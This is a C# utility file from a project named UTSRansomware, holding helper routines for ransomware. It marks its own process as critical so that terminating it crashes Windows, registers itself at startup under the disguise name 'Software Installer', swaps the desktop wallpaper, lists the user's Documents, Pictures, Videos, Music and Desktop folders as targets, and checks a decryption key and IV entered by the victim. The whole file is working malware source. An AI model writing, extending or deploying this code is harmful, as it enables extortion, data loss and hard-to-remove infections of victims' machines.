using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace UTSRansomware
{
    public static class Utils
    {
        // Allows marking process as critical to Windows OS
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        // Allows setting of desktop background
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 20;
        private  const int SPIF_UPDATEINIFILE = 0x1;
        private const int SPIF_SENDCHANGE = 0x2;

        // Array of SpecialFolders
        public static Environment.SpecialFolder[] specialFolders = {
        Environment.SpecialFolder.MyDocuments,
        Environment.SpecialFolder.MyPictures,
        Environment.SpecialFolder.MyVideos,
        Environment.SpecialFolder.MyMusic,
        Environment.SpecialFolder.Desktop,
    };

        // Function that will cause BSOD if process terminated
        public static void makeProcessUnkillable()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        // Makes program launch on startup
        public static void AddToStartup()
        {
            string appName = "Software Installer";
            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            startupKey.SetValue(appName, appPath);
        }

        public static void SetDesktopBackground()
        {
            // Determine the current application's directory.
            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;

            // Append the file name to this directory.
            string fullPath = Path.Combine(appDirectory, "DesktopBG.jpg");

            // Call SystemParametersInfo function to set the desktop wallpaper
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, fullPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }


        // Reads key and iv from user, checks to see if it matches the encryptor instance
        public static bool ValidateKeyAndIv(byte[] key, byte[] iv)
        {
            // Prompt user for key and IV
            Console.WriteLine("Please enter the key:");
            string userInputKey = Console.ReadLine();

            Console.WriteLine("Please enter the IV:");
            string userInputIv = Console.ReadLine();

            // Convert the base64 strings to byte arrays
            byte[] inputKeyBytes = Convert.FromBase64String(userInputKey);
            byte[] inputIvBytes = Convert.FromBase64String(userInputIv);

            // Check if they match the current key and iv
            bool keyMatches = key.SequenceEqual(inputKeyBytes);
            bool ivMatches = iv.SequenceEqual(inputIvBytes);

            return keyMatches && ivMatches;
        }
    }
}
